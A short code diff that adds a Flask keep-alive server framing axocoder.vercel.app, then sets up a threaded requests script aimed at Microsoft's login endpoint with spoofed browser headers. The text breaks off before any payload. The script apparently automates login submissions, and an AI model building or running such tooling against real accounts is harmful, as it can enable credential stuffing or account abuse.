@@ -1,10 +1,27 @@
+from flask import Flask, render_template
+from threading import Thread
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return '''<body style="margin: 0; padding: 0;">
+    <iframe width="100%" height="100%" src="https://axocoder.vercel.app/" frameborder="0" allowfullscreen></iframe>
+  </body>'''
+
+def run():
+    app.run(host='0.0.0.0', port=8080)
+
+def keep_alive():  
+    t = Thread(target=run)
+    t.start()
+
+keep_alive()
+print("Server Running Because of Axo")
 import requests
 import threading
-import os
-from keep_alive import keep_alive
-keep_alive()
 
-
+# URL ve sabit payload/headers bilgileri
 url = "https://login.live.com/ppsecure/post.srf"
 headers = {
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
